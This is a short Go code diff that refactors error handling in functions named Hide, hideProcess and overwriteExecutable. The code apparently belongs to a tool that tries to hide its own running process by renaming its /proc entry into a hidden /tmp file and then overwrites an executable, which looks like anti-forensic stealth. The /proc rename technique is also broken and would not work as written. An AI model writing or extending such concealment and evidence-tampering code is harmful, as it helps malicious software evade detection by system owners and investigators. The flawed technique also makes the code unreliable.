@@ -25,10 +25,8 @@ func Hide() error {
 func hideProcess() error {
 	pid := os.Getpid()
 	newName := "/tmp/." + strconv.Itoa(pid)
-
 	oldPath := "/proc/" + strconv.Itoa(pid)
-	err := os.Rename(oldPath, newName)
-	if err != nil {
+	if err := os.Rename(oldPath, newName); err != nil {
 		return err
 	}
 	return nil
@@ -39,9 +37,17 @@ func overwriteExecutable() error {
 	if err != nil {
 		return err
 	}
-	defer f.Close()
+	defer func(f *os.File) {
+		err := f.Close()
+		if err != nil {
 
-	f.Write([]byte(" "))
+		}
+	}(f)
+
+	_, err = f.Write([]byte(" "))
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
